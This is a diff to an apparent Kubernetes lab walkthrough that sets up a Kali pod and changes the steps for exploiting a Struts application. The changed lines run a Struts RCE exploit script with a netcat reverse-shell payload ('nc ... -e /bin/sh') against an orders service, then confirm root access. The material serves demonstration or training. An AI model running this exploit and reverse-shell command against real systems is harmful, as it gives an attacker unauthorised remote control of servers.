@@ -28,7 +28,7 @@ export KUBECONFIG=$(pwd)/kubeconf
 
 4. note the ClusterIP for the kali workload
 ```
-kubectl get service/kali
+kubectl get service/kali-kali
 ```
 
 5. open a terminal and create a reverse shell in the kali pod
@@ -38,9 +38,11 @@ kubectl exec -it $(kubectl get pods --selector=app=kali-kali --template "{{range
 
 6. open another terminal and execute the RCE payload in the kali workload
 ```
-python3 /payloads/struts-pwn2.py --exploit --url 'http://orders.16.16.179.1.sslip.io/super-app/orders/3' -c 'nc -nv X.X.X.X 1337 -e /bin/sh
+kubectl exec -it $(kubectl get pods --selector=app=kali-kali --template "{{range .items}}{{.metadata.name}}{{\"\n\"}}{{end}}") -- bash
+python3 /payloads/struts-pwn2.py --exploit --url 'http://URL/super-app/orders/3' -c 'nc -nv X.X.X.X 1337 -e /bin/sh'
 ```
 where `X.X.X.X` is the IP to the kali service you got in step 4
+and the URL is the HOSTS of struts-orders ingress `kubectl get ingress struts-orders`
 
 7. In the recerse shell type some commands, like prove you are root with `whoami`
 
